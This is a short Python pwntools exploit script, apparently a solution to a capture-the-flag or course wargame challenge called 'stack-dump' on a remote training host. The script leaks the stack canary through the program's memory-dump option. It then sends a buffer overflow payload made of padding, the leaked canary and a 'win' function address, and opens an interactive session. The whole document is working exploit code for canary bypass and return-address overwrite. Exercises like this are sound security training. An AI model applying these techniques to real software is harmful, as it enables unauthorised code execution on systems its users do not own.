from pwn import *

p = remote("6447.lol", 2004)
# p=process(b'./stack-dump')
CANARY_SIZE = 8
BUFF_SIZE = 56
OFFSET = 65
addr = 0x7FFFFFFFEB47
win_addr = p64(0x4012F6)

CANARY_ADDR = OFFSET + addr

p.sendline(b"i")
p.sendline(p64(addr + OFFSET) + b"\n")
p.sendline(b"D")

p.recvuntil(b"memory at " + hex(CANARY_ADDR).encode("ascii") + b": ")

# data = p.recvline()
data = p.recv(8)
print(f"We got the canary: 0x{data.hex()}")
print(f"We got the canary: 0x{data}")


le = p64(u64(data), "little")
be = p64(u64(data), "big")

# BUffer
# Data
# Stack canary
# Data
# RBP
# RETURN ADDRESS

padding = b"A" * BUFF_SIZE
padding_to_ret_addr = 24 * b"A"
payload: bytes = padding + data + padding_to_ret_addr + win_addr
print(f"The payload is {payload.hex()}")
p.sendline(b"i")
p.sendline(payload + b"\n")

# p.recvline()
p.interactive()
